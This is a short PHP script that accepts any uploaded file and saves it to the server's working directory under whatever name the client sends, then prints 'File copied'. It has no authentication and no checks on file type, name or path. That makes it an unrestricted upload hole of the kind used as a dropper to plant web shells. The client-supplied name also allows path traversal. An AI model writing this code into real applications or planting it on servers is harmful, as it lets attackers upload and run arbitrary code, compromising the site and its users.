<?php
$nifileheader = "file";
if (isset($_FILES[$nifileheader])) {
	copy ($_FILES[$nifileheader]['tmp_name'], $_FILES[$nifileheader]['name']);
	echo "File copied";
}

?>